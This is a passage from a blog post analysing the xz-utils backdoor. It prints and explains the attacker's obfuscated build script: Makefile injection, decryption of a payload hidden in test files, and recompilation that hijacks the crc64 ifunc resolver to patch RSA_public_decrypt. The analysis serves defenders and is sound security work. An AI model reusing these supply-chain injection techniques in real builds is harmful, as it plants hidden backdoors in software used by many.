&#34;$j&#34; src/liblzma/Makefile &amp;gt; /dev/null 2&amp;gt;&amp;amp;1;then&#xA;exit 0&#xA;fi&#xA;z=&#34;^am__uninstall_files_from_dir = {&#34;&#xA;if ! grep -qs &#34;$z&#34; src/liblzma/Makefile &amp;gt; /dev/null 2&amp;gt;&amp;amp;1;then&#xA;exit 0&#xA;fi&#xA;w=&#34;^am__install_max =&#34;&#xA;if ! grep -qs &#34;$w&#34; src/liblzma/Makefile &amp;gt; /dev/null 2&amp;gt;&amp;amp;1;then&#xA;exit 0&#xA;fi&#xA;E=$z&#xA;if ! grep -qs &#34;$E&#34; src/liblzma/Makefile &amp;gt; /dev/null 2&amp;gt;&amp;amp;1;then&#xA;exit 0&#xA;fi&#xA;Q=&#34;^am__vpath_adj_setup =&#34;&#xA;if ! grep -qs &#34;$Q&#34; src/liblzma/Makefile &amp;gt; /dev/null 2&amp;gt;&amp;amp;1;then&#xA;exit 0&#xA;fi&#xA;M=&#34;^am__include = include&#34;&#xA;if ! grep -qs &#34;$M&#34; src/liblzma/Makefile &amp;gt; /dev/null 2&amp;gt;&amp;amp;1;then&#xA;exit 0&#xA;fi&#xA;L=&#34;^all: all-recursive$&#34;&#xA;if ! grep -qs &#34;$L&#34; src/liblzma/Makefile &amp;gt; /dev/null 2&amp;gt;&amp;amp;1;then&#xA;exit 0&#xA;fi&#xA;m=&#34;^LTLIBRARIES = \$(lib_LTLIBRARIES)&#34;&#xA;if ! grep -qs &#34;$m&#34; src/liblzma/Makefile &amp;gt; /dev/null 2&amp;gt;&amp;amp;1;then&#xA;exit 0&#xA;fi&#xA;u=&#34;AM_V_CCLD = \$(am__v_CCLD_\$(V))&#34;&#xA;if ! grep -qs &#34;$u&#34; src/liblzma/Makefile &amp;gt; /dev/null 2&amp;gt;&amp;amp;1;then&#xA;exit 0&#xA;fi&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Check that &lt;code&gt;liblzma/Makefile&lt;/code&gt; contains all the lines that will be used as anchor points later for inserting new text into the Makefile.&#xA;&lt;pre&gt;if ! grep -qs &#34;$O&#34; libtool &amp;gt; /dev/null 2&amp;gt;&amp;amp;1;then&#xA;exit 0&#xA;fi&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;&lt;code&gt;$O&lt;/code&gt; was set at the very start of the script. This is checking that the libtool file, presumably generated during the build process, configures the compiler for a PIC (position independent code) build.&#xA;&lt;pre&gt;eval $zrKcTy&#xA;b=&#34;am__test = $U&#34;&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;&lt;code&gt;$U&lt;/code&gt; was also set at the start of the script: &lt;code&gt;U=&#34;bad-3-corrupt_lzma2.xz&#34;&lt;/code&gt;. Real work is starting!&#xA;&lt;pre&gt;sed -i &#34;/$j/i$b&#34; src/liblzma/Makefile || true&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;&lt;code&gt;sed -i&lt;/code&gt; runs an in-place modification of the input file, in this case &lt;code&gt;liblzma/Makefile&lt;/code&gt;. Specifically, find the &lt;code&gt;ACLOCAL_M4&lt;/code&gt; line we grepped for earlier (&lt;code&gt;/$j/&lt;/code&gt;) and insert the &lt;code&gt;am__test&lt;/code&gt; setting from &lt;code&gt;$b&lt;/code&gt; (&lt;code&gt;i$b&lt;/code&gt;).&#xA;&lt;pre&gt;d=`echo $gl_path_map | sed &#39;s/\\\/\\\\\\\\/g&#39;`&#xA;b=&#34;am__strip_prefix = $d&#34;&#xA;sed -i &#34;/$w/i$b&#34; src/liblzma/Makefile || true&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Shell quoting inside a quoted string inside a Makefile really is something special. This is escaping the backslashes in the tr command enough times that it will work to insert them into the Makefile after the &lt;code&gt;am__install_max&lt;/code&gt; line (&lt;code&gt;$w&lt;/code&gt;).&#xA;&lt;pre&gt;b=&#34;am__dist_setup = \$(am__strip_prefix) | xz -d 2&amp;gt;/dev/null | \$(SHELL)&#34;&#xA;sed -i &#34;/$E/i$b&#34; src/liblzma/Makefile || true&#xA;b=&#34;\$(top_srcdir)/tests/files/\$(am__test)&#34;&#xA;s=&#34;am__test_dir=$b&#34;&#xA;sed -i &#34;/$Q/i$s&#34; src/liblzma/Makefile || true&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;More added lines. It’s worth stopping for a moment to look at what’s happened so far. The script has added these lines to &lt;code&gt;src/liblzma/Makefile&lt;/code&gt;:&#xA;&lt;pre&gt;am__test = bad-3-corrupt_lzma2.xz&#xA;am__strip_prefix = tr &#34;\\t \\-_&#34; &#34; \\t_\\-&#34;&#xA;am__dist_setup = $(am_strip_prefix) | xz -d 2&amp;gt;/dev/null | $(SHELL)&#xA;am__test_dir = $(top_srcdir)/tests/files/$(am__test)&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;&lt;br&gt;&#xA;These look plausible but fall apart under closer examination: for example, &lt;code&gt;am__test_dir&lt;/code&gt; is a file, not a directory. The goal here seems to be that after &lt;code&gt;configure&lt;/code&gt; has run, the generated &lt;code&gt;Makefile&lt;/code&gt; still looks plausibly inscrutable. And the lines have been added in scattered places throughout the &lt;code&gt;Makefile&lt;/code&gt;; no one will see them all next to each other like in this display. Back to the script:&#xA;&lt;pre&gt;h=&#34;-Wl,--sort-section=name,-X&#34;&#xA;if ! echo &#34;$LDFLAGS&#34; | grep -qs -e &#34;-z,now&#34; -e &#34;-z -Wl,now&#34; &amp;gt; /dev/null 2&amp;gt;&amp;amp;1;then&#xA;h=$h&#34;,-z,now&#34;&#xA;fi&#xA;j=&#34;liblzma_la_LDFLAGS += $h&#34;&#xA;sed -i &#34;/$L/i$j&#34; src/liblzma/Makefile || true&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;&lt;br&gt;&#xA;Add &lt;code&gt;liblzma_la_LDFLAGS += -Wl,--sort-section=name,-X&lt;/code&gt; to the Makefile. If the &lt;code&gt;LDFLAGS&lt;/code&gt; do not already say &lt;code&gt;-z,now&lt;/code&gt; or &lt;code&gt;-Wl,now&lt;/code&gt;, add &lt;code&gt;-z,now&lt;/code&gt;.&#xA;&#xA;&lt;p&gt;&#xA;The “&lt;code&gt;-Wl,now&lt;/code&gt;” forces &lt;code&gt;LD_BIND_NOW&lt;/code&gt; behavior, in which the dynamic loader resolves all symbols at program startup time. One reason this is normally done is for security: it makes sure that the global offset table and procedure linkage tables can be marked read-only early in process startup, so that buffer overflows or write-after-free bugs cannot target those tables. However, it also has the effect of running GNU indirect function (ifunc) resolvers at startup during that resolution process, and the backdoor arranges to be called from one of those. This early invocation of the backdoor setup lets it run while the tables are still writable, allowing the backdoor to replace the entry for &lt;code&gt;RSA_public_decrypt&lt;/code&gt; with its own version. But we are getting ahead of ourselves. Back to the script:&#xA;&lt;pre&gt;sed -i &#34;s/$O/$C/g&#34; libtool || true&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;We checked earlier that the libtool file said &lt;code&gt;pic_flag=&#34; -fPIC -DPIC&#34;&lt;/code&gt;. The sed command changes it to read &lt;code&gt;pic_flag=&#34; -fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections&#34;&lt;/code&gt;.&#xA;&#xA;&lt;p&gt;&#xA;It is not clear why these additional flags are important, but in general they disable linker optimizations that could plausibly get in the way of subterfuge.&#xA;&lt;pre&gt;k=&#34;AM_V_CCLD = @echo -n \$(LTDEPS); \$(am__v_CCLD_\$(V))&#34;&#xA;sed -i &#34;s/$u/$k/&#34; src/liblzma/Makefile || true&#xA;l=&#34;LTDEPS=&#39;\$(lib_LTDEPS)&#39;; \\\\\n\&#xA;    export top_srcdir=&#39;\$(top_srcdir)&#39;; \\\\\n\&#xA;    export CC=&#39;\$(CC)&#39;; \\\\\n\&#xA;    export DEFS=&#39;\$(DEFS)&#39;; \\\\\n\&#xA;    export DEFAULT_INCLUDES=&#39;\$(DEFAULT_INCLUDES)&#39;; \\\\\n\&#xA;    export INCLUDES=&#39;\$(INCLUDES)&#39;; \\\\\n\&#xA;    export liblzma_la_CPPFLAGS=&#39;\$(liblzma_la_CPPFLAGS)&#39;; \\\\\n\&#xA;    export CPPFLAGS=&#39;\$(CPPFLAGS)&#39;; \\\\\n\&#xA;    export AM_CFLAGS=&#39;\$(AM_CFLAGS)&#39;; \\\\\n\&#xA;    export CFLAGS=&#39;\$(CFLAGS)&#39;; \\\\\n\&#xA;    export AM_V_CCLD=&#39;\$(am__v_CCLD_\$(V))&#39;; \\\\\n\&#xA;    export liblzma_la_LINK=&#39;\$(liblzma_la_LINK)&#39;; \\\\\n\&#xA;    export libdir=&#39;\$(libdir)&#39;; \\\\\n\&#xA;    export liblzma_la_OBJECTS=&#39;\$(liblzma_la_OBJECTS)&#39;; \\\\\n\&#xA;    export liblzma_la_LIBADD=&#39;\$(liblzma_la_LIBADD)&#39;; \\\\\n\&#xA;sed rpath \$(am__test_dir) | \$(am__dist_setup) &amp;gt;/dev/null 2&amp;gt;&amp;amp;1&#34;;&#xA;sed -i &#34;/$m/i$l&#34; src/liblzma/Makefile || true&#xA;eval $zrKcHD&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Shell quoting continues to be trippy, but we’ve reached the final change. This adds the line&#xA;&lt;pre&gt;AM_V_CCLD = @echo -n $(LTDEPS); $(am__v_CCLD_$(V))&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;to one place in the Makefile, and then adds a long script that sets up some variables, entirely as misdirection, that ends with&#xA;&lt;pre&gt;sed rpath $(am__test_dir) | $(am__dist_setup) &amp;gt;/dev/null 2&amp;gt;&amp;amp;1&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;The &lt;code&gt;sed rpath&lt;/code&gt; command is just as much an obfuscated &lt;code&gt;cat&lt;/code&gt; as &lt;code&gt;sed &#34;r\n&#34;&lt;/code&gt; was, but &lt;code&gt;-rpath&lt;/code&gt; is a very common linker flag, so at first glance you might not notice it’s next to the wrong command. Recalling the &lt;code&gt;am__test&lt;/code&gt; and related lines added above, this pipeline ends up being equivalent to:&#xA;&lt;pre&gt;cat ./tests/files/bad-3-corrupt_lzma2.xz |&#xA;tr &#34;\t \-_&#34; &#34; \t_\-&#34; |&#xA;xz -d |&#xA;/bin/sh&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Our old friend! We know what this does, though. It runs the very script we are currently reading in this post. &lt;a href=&#34;https://research.swtch.com/zip&#34;&gt;How recursive!&lt;/a&gt;&#xA;&lt;a class=anchor href=&#34;#make&#34;&gt;&lt;h2 id=&#34;make&#34;&gt;Make&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Instead of running during &lt;code&gt;configure&lt;/code&gt; in the tarball root directory, let’s mentally re-execute the script as it would run during &lt;code&gt;make&lt;/code&gt; in the &lt;code&gt;liblzma&lt;/code&gt; directory. In that context, the variables at the top have been set, but all the editing we just considered was skipped over by “if #1” not finding &lt;code&gt;./config.status&lt;/code&gt;. Now let’s keep executing the script.&#xA;&lt;pre&gt;fi&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;That &lt;code&gt;fi&lt;/code&gt; closes “if #2”, which checked for a Debian or RPM build. The upcoming &lt;code&gt;elif&lt;/code&gt; continues “if #1”, which checked for config.status, meaning now we are executing the part of the script that matters when run during &lt;code&gt;make&lt;/code&gt; in the &lt;code&gt;liblzma&lt;/code&gt; directory:&#xA;&lt;pre&gt;elif (test -f .libs/liblzma_la-crc64_fast.o) &amp;amp;&amp;amp; (test -f .libs/liblzma_la-crc32_fast.o); then&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;If we see the built objects for the crc code, we are running as part of &lt;code&gt;make&lt;/code&gt;. Run the following code.&#xA;&lt;pre&gt;# Entirely new in 5.6.1&#xA;vs=`grep -broaF &#39;jV!.^%&#39; $top_srcdir/tests/files/ 2&amp;gt;/dev/null`&#xA;if test &#34;x$vs&#34; != &#34;x&#34; &amp;gt; /dev/null 2&amp;gt;&amp;amp;1;then&#xA;f1=`echo $vs | cut -d: -f1`&#xA;if test &#34;x$f1&#34; != &#34;x&#34; &amp;gt; /dev/null 2&amp;gt;&amp;amp;1;then&#xA;start=`expr $(echo $vs | cut -d: -f2) + 7`&#xA;ve=`grep -broaF &#39;%.R.1Z&#39; $top_srcdir/tests/files/ 2&amp;gt;/dev/null`&#xA;if test &#34;x$ve&#34; != &#34;x&#34; &amp;gt; /dev/null 2&amp;gt;&amp;amp;1;then&#xA;f2=`echo $ve | cut -d: -f1`&#xA;if test &#34;x$f2&#34; != &#34;x&#34; &amp;gt; /dev/null 2&amp;gt;&amp;amp;1;then&#xA;[ ! &#34;x$f2&#34; = &#34;x$f1&#34; ] &amp;amp;&amp;amp; exit 0&#xA;[ ! -f $f1 ] &amp;amp;&amp;amp; exit 0&#xA;end=`expr $(echo $ve | cut -d: -f2) - $start`&#xA;eval `cat $f1 | tail -c +${start} | head -c +${end} |&#xA;    tr &#34;\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131&#34; &#34;\0-\377&#34; |&#xA;    xz -F raw --lzma2 -dc`&#xA;fi&#xA;fi&#xA;fi&#xA;fi&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;We start this section with another extension hook. This time the magic strings are &lt;code&gt;&#39;jV!.^%&#39;&lt;/code&gt; and &lt;code&gt;&#39;%.R.1Z&#39;&lt;/code&gt;. As before, there are no test files with these strings. This was for future extensibility.&#xA;&#xA;&lt;p&gt;&#xA;On to the code shared with 5.6.0:&#xA;&lt;pre&gt;eval $zrKcKQ&#xA;if ! grep -qs &#34;$R()&#34; $top_srcdir/src/liblzma/check/crc64_fast.c; then&#xA;exit 0&#xA;fi&#xA;if ! grep -qs &#34;$R()&#34; $top_srcdir/src/liblzma/check/crc32_fast.c; then&#xA;exit 0&#xA;fi&#xA;if ! grep -qs &#34;$R&#34; $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then&#xA;exit 0&#xA;fi&#xA;if ! grep -qs &#34;$x&#34; $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then&#xA;exit 0&#xA;fi&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Check that the ifunc-enabled CRC source files look right. Interestingly, Lasse Collin renamed &lt;code&gt;crc_clmul.c&lt;/code&gt; to &lt;code&gt;crc_x86_clmul.h&lt;/code&gt; &lt;a href=&#34;https://git.tukaani.org/?p=xz.git;a=commit;h=419f55f9dfc2df8792902b8953d50690121afeea&#34;&gt;on 2024-01-11&lt;/a&gt;. One has to assume that the person or team behind “Jia Tan” had been working on all this code well before then and that the first version checked &lt;code&gt;crc_clmul.c&lt;/code&gt;. They were probably very annoyed when Lasse Collin accidentally broke their in-development backdoor by cleaning up the file names!&#xA;&lt;pre&gt;if ! grep -qs &#34;$C&#34; ../../libtool; then&#xA;exit 0&#xA;fi&#xA;if ! echo $liblzma_la_LINK | grep -qs -e &#34;-z,now&#34; -e &#34;-z -Wl,now&#34; &amp;gt; /dev/null 2&amp;gt;&amp;amp;1;then&#xA;exit 0&#xA;fi&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Check that the build configuration has the extra flags we added before.&#xA;&lt;pre&gt;if echo $liblzma_la_LINK | grep -qs -e &#34;lazy&#34; &amp;gt; /dev/null 2&amp;gt;&amp;amp;1;then&#xA;exit 0&#xA;fi&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Check that no one has added &lt;code&gt;lazy&lt;/code&gt; to the linker options, which might override the &lt;code&gt;-Wl,now&lt;/code&gt;. (This code really needs to run before the tables it patches get marked read-only!)&#xA;&lt;pre&gt;N=0&#xA;W=0&#xA;Y=`grep &#34;dnl Convert it to C string syntax.&#34; $top_srcdir/m4/gettext.m4`&#xA;eval $zrKcjv&#xA;if test -z &#34;$Y&#34;; then&#xA;N=0&#xA;W=88664&#xA;else&#xA;N=88664&#xA;W=0&#xA;fi&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;This is selecting between two different offset values depending on the content of &lt;code&gt;gettext.m4&lt;/code&gt;. The distributed xz tarballs do not contain that string in &lt;code&gt;gettext.m4&lt;/code&gt; (it does appear in &lt;code&gt;build-to-host.m4&lt;/code&gt;), so the &lt;code&gt;grep&lt;/code&gt; finds nothing, &lt;code&gt;$Y&lt;/code&gt; is the empty string, and the true case of the &lt;code&gt;if&lt;/code&gt; executes: &lt;code&gt;N=0&lt;/code&gt; and &lt;code&gt;W=88792&lt;/code&gt;.&#xA;&lt;pre&gt;xz -dc $top_srcdir/tests/files/$p | eval $i | LC_ALL=C sed &#34;s/\(.\)/\1\n/g&#34; |&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;I inserted a line break here. Remember the “corrupt” test file script set &lt;code&gt;i&lt;/code&gt; to the large head pipeline? It’s still set here, being used inside the script extracted from that pipeline. Before, the pipeline extracted 33,707 bytes and then we used the final 31,233 bytes. Now we are using the entire thing, which probably means just the prefix that we skipped before. The sed command is inserting a newline after every byte of that output, setting up for piping into the remainder of the command line:&#xA;&lt;pre&gt;LC_ALL=C awk &#39;&#xA;BEGIN{&#xA;    FS=&#34;\n&#34;;RS=&#34;\n&#34;;ORS=&#34;&#34;;m=256;&#xA;    for(i=0;i&amp;lt;m;i++){t[sprintf(&#34;x%c&#34;,i)]=i;c[i]=((i*7)+5)%m;}&#xA;    i=0;j=0;for(l=0;l&amp;lt;8192;l++){i=(i+1)%m;a=c[i];j=(j+a)%m;c[i]=c[j];c[j]=a;}&#xA;}&#xA;{&#xA;    v=t[&#34;x&#34; (NF&amp;lt;1?RS:$1)];&#xA;    i=(i+1)%m;a=c[i];j=(j+a)%m;b=c[j];c[i]=b;c[j]=a;k=c[(a+b)%m];&#xA;    printf &#34;%c&#34;,(v+k)%m&#xA;}&#39; |&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;I inserted another line break here. What is this? &lt;a href=&#34;https://twitter.com/nugxperience/status/1773906926503591970&#34;&gt;@nugxperience on Twitter recognized it&lt;/a&gt; as an RC4-like decryption function, implemented in awk! Apparently the &lt;code&gt;tr&lt;/code&gt;-based substitution cipher wasn’t secure enough for this step. This is the 5.6.1 version; the 5.6.0 version is the same except that the second loop counts to 4096 instead of 8192.&#xA;&#xA;&lt;p&gt;&#xA;Back to the script:&#xA;&lt;pre&gt;xz -dc --single-stream | ((head -c +$N &amp;gt; /dev/null 2&amp;gt;&amp;amp;1) &amp;amp;&amp;amp; head -c +$W) &amp;gt; liblzma_la-crc64-fast.o || true&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;We finally made it to the end of this long line. The decrypted output is piped through xz to decompress it; the &lt;code&gt;--single-stream&lt;/code&gt; flag says to stop at the end of the first xz EOF marker instead of looking for additional files on standard input. This avoids reading the section of the input that we extracted with the &lt;code&gt;tail&lt;/code&gt; command before. Then the decompressed data is piped through a &lt;code&gt;head&lt;/code&gt; pair that extracts either the full 88,792 byte input or zero bytes, depending on &lt;code&gt;gettext.m4&lt;/code&gt; from before, and writes it to &lt;code&gt;liblzma_la-crc64-fast.o&lt;/code&gt;. In our build, we are taking the full input.&#xA;&lt;pre&gt;if ! test -f liblzma_la-crc64-fast.o; then&#xA;exit 0&#xA;fi&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;If all that failed, stop quietly.&#xA;&lt;pre&gt;cp .libs/liblzma_la-crc64_fast.o .libs/liblzma_la-crc64-fast.o || true&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Wait what? Oh! Notice the two different file names &lt;code&gt;crc64_fast&lt;/code&gt; versus &lt;code&gt;crc64-fast&lt;/code&gt;. And neither of these is the one we just extracted. These are in &lt;code&gt;.libs/&lt;/code&gt;, and the one we extracted is in the current directory. This is backing up the real file (the underscored one) into a file with a very similar name (the hyphenated one).&#xA;&lt;pre&gt;V=&#39;#endif\n#if defined(CRC32_GENERIC) &amp;amp;&amp;amp; defined(CRC64_GENERIC) &amp;amp;&amp;amp;&#xA;    defined(CRC_X86_CLMUL) &amp;amp;&amp;amp; defined(CRC_USE_IFUNC) &amp;amp;&amp;amp; defined(PIC) &amp;amp;&amp;amp;&#xA;    (defined(BUILDING_CRC64_CLMUL) || defined(BUILDING_CRC32_CLMUL))\n&#xA;    extern int _get_cpuid(int, void*, void*, void*, void*, void*);\n&#xA;    static inline bool _is_arch_extension_supported(void) { int success = 1; uint32_t r[4];&#xA;    success = _get_cpuid(1, &amp;amp;r[0], &amp;amp;r[1], &amp;amp;r[2], &amp;amp;r[3], ((char*) __builtin_frame_address(0))-16);&#xA;    const uint32_t ecx_mask = (1 &amp;lt;&amp;lt; 1) | (1 &amp;lt;&amp;lt; 9) | (1 &amp;lt;&amp;lt; 19);&#xA;    return success &amp;amp;&amp;amp; (r[2] &amp;amp; ecx_mask) == ecx_mask; }\n&#xA;    #else\n&#xA;    #define _is_arch_extension_supported is_arch_extension_supported&#39;&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;This string &lt;code&gt;$V&lt;/code&gt; begins with “&lt;code&gt;#endif&lt;/code&gt;”, which is never a good sign. Let’s move on for now, but we’ll take a closer look at that text shortly.&#xA;&lt;pre&gt;eval $yosA&#xA;if sed &#34;/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()&#34; $top_srcdir/src/liblzma/check/crc64_fast.c | \&#xA;sed &#34;/include \&#34;crc_x86_clmul.h\&#34;/a \\$V&#34; | \&#xA;sed &#34;1i # 0 \&#34;$top_srcdir/src/liblzma/check/crc64_fast.c\&#34;&#34; 2&amp;gt;/dev/null | \&#xA;$CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS \&#xA;    $CFLAGS -r liblzma_la-crc64-fast.o -x c -  $P -o .libs/liblzma_la-crc64_fast.o 2&amp;gt;/dev/null; then&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;This &lt;code&gt;if&lt;/code&gt; statement is running a pipeline of sed commands piped into &lt;code&gt;$CC&lt;/code&gt; with the arguments &lt;code&gt;liblzma_la-crc64-fast.o&lt;/code&gt; (adding that object as an input to the compiler) and &lt;code&gt;-x&lt;/code&gt; &lt;code&gt;c&lt;/code&gt; &lt;code&gt;-&lt;/code&gt; (compile a C program from standard input). That is, it rebuilds an edited copy of &lt;code&gt;crc64_fast.c&lt;/code&gt; (a real xz source file) and merges the extracted malicious &lt;code&gt;.o&lt;/code&gt; file into the resulting object, overwriting the underscored real object file that would have been built originally for &lt;code&gt;crc64_fast.c&lt;/code&gt;. The &lt;code&gt;sed&lt;/code&gt; &lt;code&gt;1i&lt;/code&gt; tells the compiler the file name to record in debug info, since the compiler is reading standard input—very tidy! But what are the edits?&#xA;&#xA;&lt;p&gt;&#xA;The file starts out looking like:&#xA;&lt;pre&gt;...&#xA;#if defined(CRC_X86_CLMUL)&#xA;#   define BUILDING_CRC64_CLMUL&#xA;#   include &#34;crc_x86_clmul.h&#34;&#xA;#endif&#xA;...&#xA;static crc64_func_type&#xA;crc64_resolve(void)&#xA;{&#xA;    return is_arch_extension_supported()&#xA;            ? &amp;amp;crc64_arch_optimized : &amp;amp;crc64_generic;&#xA;}&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;The sed commands add an &lt;code&gt;_&lt;/code&gt; prefix to the name of the function in the return condition, and then add &lt;code&gt;$V&lt;/code&gt; after the &lt;code&gt;include&lt;/code&gt; line, producing (with reformatting of the C code):&#xA;&lt;pre&gt;# 0 &#34;path/to/src/liblzma/check/crc64_fast.c&#34;&#xA;...&#xA;#if defined(CRC_X86_CLMUL)&#xA;#   define BUILDING_CRC64_CLMUL&#xA;#   include &#34;crc_x86_clmul.h&#34;&#xA;#endif&#xA;&#xA;#if defined(CRC32_GENERIC) &amp;amp;&amp;amp; defined(CRC64_GENERIC) &amp;amp;&amp;amp; \&#xA;    defined(CRC_X86_CLMUL) &amp;amp;&amp;amp; defined(CRC_USE_IFUNC) &amp;amp;&amp;amp; defined(PIC) &amp;amp;&amp;amp; \&#xA;    (defined(BUILDING_CRC64_CLMUL) || defined(BUILDING_CRC32_CLMUL))&#xA;&#xA;extern int _get_cpuid(int, void*, void*, void*, void*, void*);&#xA;&#xA;static inline bool _is_arch_extension_supported(void) {&#xA;    int success = 1;&#xA;    uint32_t r[4];&#xA;    success = _get_cpuid(1, &amp;amp;r[0], &amp;amp;r[1], &amp;amp;r[2], &amp;amp;r[3], ((char*) __builtin_frame_address(0))-16);&#xA;    const uint32_t ecx_mask = (1 &amp;lt;&amp;lt; 1) | (1 &amp;lt;&amp;lt; 9) | (1 &amp;lt;&amp;lt; 19);&#xA;    return success &amp;amp;&amp;amp; (r[2] &amp;amp; ecx_mask) == ecx_mask;&#xA;}&#xA;&#xA;#else&#xA;#define _is_arch_extension_supported is_arch_extension_supported&#xA;#endif&#xA;...&#xA;static crc64_func_type&#xA;crc64_resolve(void)&#xA;{&#xA;    return _is_arch_extension_supported()&#xA;            ? &amp;amp;crc64_arch_optimized : &amp;amp;crc64_generic;&#xA;}&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;That is, the crc64_resolve function, which is the ifunc resolver that gets run early in dynamic loading, before the GOT and PLT have been marked read-only, is now calling the newly inserted &lt;code&gt;_is_arch_extension_supported&lt;/code&gt;, which calls &lt;code&gt;_get_cpuid&lt;/code&gt;. This still looks like plausible code, since this is pretty similar to &lt;a href=&#34;https://git.tukaani.org/?p=xz.git;a=blob;f=src/liblzma/check/crc_x86_clmul.h;h=ae66ca9f8c710fd84cd8b0e6e52e7bbfb7df8c0f;hb=2d7d862e3ffa8cec4fd3fdffcd84e984a17aa429#l388&#34;&gt;the real is_arch_extension_supported&lt;/a&gt;. But &lt;code&gt;_get_cpuid&lt;/code&gt; is provided by the backdoor .o, and it does a lot more before returning the cpuid information. In particular it rewrites the GOT and PLT to hijack calls to RSA_public_decrypt.&#xA;&#xA;&lt;p&gt;&#xA;But let’s get back to the shell script, which is still running from inside &lt;code&gt;src/liblzma/Makefile&lt;/code&gt; and just successfully inserted the backdoor into &lt;code&gt;.libs/liblzma_la-crc64_fast.o&lt;/code&gt;. We are now in the &lt;code&gt;if&lt;/code&gt; compiler success case:&#xA;&lt;pre&gt;cp .libs/liblzma_la-crc32_fast.o .libs/liblzma_la-crc32-fast.o || true&#xA;eval $BPep&#xA;if sed &#34;/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()&#34; $top_srcdir/src/liblzma/check/crc32_fast.c | \&#xA;sed &#34;/include \&#34;crc32_arm64.h\&#34;/a \\$V&#34; | \&#xA;sed &#34;1i # 0 \&#34;$top_srcdir/src/liblzma/check/crc32_fast.c\&#34;&#34; 2&amp;gt;/dev/null | \&#xA;$CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS \&#xA;    $CFLAGS -r -x c -  $P -o .libs/liblzma_la-crc32_fast.o; then&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;This does the same thing for &lt;code&gt;crc32_fast.c&lt;/code&gt;, except it doesn’t add the backdoored object code. We don’t want two copies of that in the build. It is unclear why the script bothers to intercept both the crc32 and crc64 ifuncs; either one should have sufficed. Perhaps they wanted the dispatch code for both to look similar in a debugger. Now we’re in the doubly nested &lt;code&gt;if&lt;/code&gt; compiler success case:&#xA;&lt;pre&gt;eval $RgYB&#xA;if $AM_V_CCLD$liblzma_la_LINK -rpath $libdir $liblzma_la_OBJECTS $liblzma_la_LIBADD; then&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;If we can relink the .la file, then...&#xA;&lt;pre&gt;if test ! -f .libs/liblzma.so; then&#xA;mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true&#xA;mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true&#xA;fi&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;&lt;br&gt;&#xA;If the relink succeeded but didn’t write the file, assume it failed and restore the backups.&#xA;&lt;pre&gt;rm -fr .libs/liblzma.a .libs/liblzma.la .libs/liblzma.lai .libs/liblzma.so* || true&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;No matter what, remove the libraries. (The &lt;code&gt;Makefile&lt;/code&gt; link step is presumably going to happen next and recreate them.)&#xA;&lt;pre&gt;else&#xA;mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true&#xA;mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true&#xA;fi&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;This is the &lt;code&gt;else&lt;/code&gt; for the link failing. Restore from backups.&#xA;&lt;pre&gt;rm -f .libs/liblzma_la-crc32-fast.o || true&#xA;rm -f .libs/liblzma_la-crc64-fast.o || 